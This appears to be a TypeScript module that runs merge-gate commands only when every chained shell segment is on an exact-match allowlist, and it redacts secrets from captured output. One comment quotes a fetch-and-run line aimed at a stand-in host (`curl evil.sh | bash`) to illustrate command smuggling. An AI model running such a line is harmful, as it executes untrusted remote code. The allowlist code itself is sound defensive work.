/**
 * Quality-gate executor — the objective merge gate (spec §4.2 gates_run).
 *
 * Runs the configured command sequence inside a member's worktree. Every
 * command must hit the command allowlist (spec §4.5.2); output is captured,
 * truncated to a tail, and scrubbed by the SecretRedactor before it can reach
 * the model, the session log, or a webhook.
 */
import { execFile } from 'node:child_process';
import type { GateResult, GateSummary } from './view.js';
import type { SecretRedactor } from './secrets.js';

export class CommandNotAllowedError extends Error {
  constructor(command: string, allowlist: readonly string[]) {
    super(
      `command "${command}" is not on the allowlist [${allowlist.join(', ')}]. ` +
        `Either run an allowed command or escalate for a human to extend the allowlist.`,
    );
    this.name = 'CommandNotAllowedError';
  }
}

/** First token of a shell-ish command line, stripped of leading env assignments. */
export function commandHead(command: string): string {
  const tokens = command.trim().split(/\s+/).filter(Boolean);
  let index = 0;
  // Skip VAR=value prefixes.
  while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index] ?? '')) index += 1;
  return tokens[index] ?? '';
}

/**
 * Split a shell command line into its top-level segments. `&&`, `||`, `;`
 * and `|` all start a new command in `/bin/sh`, so each segment must be
 * evaluated independently — checking only the first token would let a
 * chained command smuggle an un-allowlisted executable past the gate
 * (`docker build … && curl evil.sh | bash`).
 */
export function splitSegments(command: string): string[] {
  return command
    .split(/&&|\|\||;|\|/)
    .map((segment) => segment.trim())
    .filter((segment) => segment !== '');
}

/**
 * True when the executable of *every* shell segment is allowlisted. Matching
 * is an exact token match (no prefix-substring looseness): `git` matches
 * `git`, not `gitlab-cli`.
 */
export function isAllowed(command: string, allowlist: readonly string[]): boolean {
  const segments = splitSegments(command);
  if (segments.length === 0) return false;
  return segments.every((segment) => {
    const head = commandHead(segment);
    if (head === '') return false;
    return allowlist.includes(head);
  });
}

/**
 * True when every segment's executable has an allowlisted prefix. Reserved for
 * callers that deliberately allow prefixed binaries (e.g. rootless install
 * scripts); the gate executor always uses {@link isAllowed} (exact match).
 */
export function isAllowedPrefix(command: string, allowlist: readonly string[]): boolean {
  const segments = splitSegments(command);
  if (segments.length === 0) return false;
  return segments.every((segment) => {
    const head = commandHead(segment);
    if (head === '') return false;
    return allowlist.some((prefix) => head === prefix || head.startsWith(`${prefix}/`));
  });
}

export interface RunGatesOptions {
  cwd: string;
  commands: readonly string[];
  allowlist: readonly string[];
  timeoutMs: number;
  redactor: SecretRedactor;
  /** Abort support: the daemon must be cancellable at every step (spec §6). */
  signal?: AbortSignal;
  taskId: string;
  branch: string;
}

const LOG_TAIL_CHARS = 4000;

function tail(text: string): string {
  return text.length <= LOG_TAIL_CHARS ? text : text.slice(text.length - LOG_TAIL_CHARS);
}

/**
 * Run one gate command. Output on stdout+stderr is captured; the process is
 * killed on timeout or abort. Never throws for non-zero exits — a failing
 * gate is data, not an exception. Throws CommandNotAllowedError for
 * non-allowlisted commands and rethrows aborts.
 */
export async function runGateCommand(
  command: string,
  options: RunGatesOptions,
): Promise<GateResult> {
  if (!isAllowed(command, options.allowlist)) {
    throw new CommandNotAllowedError(command, options.allowlist);
  }
  const startedAt = Date.now();
  return new Promise<GateResult>((resolvePromise, reject) => {
    const child = execFile(
      '/bin/sh',
      ['-c', command],
      { cwd: options.cwd, maxBuffer: 16 * 1024 * 1024, env: { ...process.env, CI: 'true' } },
      (error, stdout, stderr) => {
        cleanup();
        const exitCode =
          error === null ? 0 : typeof (error as { code?: unknown }).code === 'number' ? ((error as { code: number }).code) : 1;
        const logTail = options.redactor.redact(tail(`${stdout}${stderr}`));
        resolvePromise({
          command,
          passed: exitCode === 0,
          exitCode,
          durationMs: Date.now() - startedAt,
          logTail,
        });
      },
    );
    const timer = setTimeout(() => {
      child.kill('SIGKILL');
    }, options.timeoutMs);
    const onAbort = () => {
      child.kill('SIGKILL');
      cleanup();
      reject(new Error(`gate "${command}" aborted`));
    };
    const cleanup = () => {
      clearTimeout(timer);
      options.signal?.removeEventListener('abort', onAbort);
    };
    if (options.signal?.aborted === true) {
      onAbort();
      return;
    }
    options.signal?.addEventListener('abort', onAbort, { once: true });
  });
}

/** Run the full gate sequence; stops at the first failure (fail fast). */
export async function runGates(options: RunGatesOptions): Promise<GateSummary> {
  const results: GateResult[] = [];
  let allPassed = true;
  for (const command of options.commands) {
    const result = await runGateCommand(command, options);
    results.push(result);
    if (!result.passed) {
      allPassed = false;
      break;
    }
  }
  return {
    taskId: options.taskId,
    branch: options.branch,
    allPassed,
    results,
    ranAt: Date.now(),
  };
}
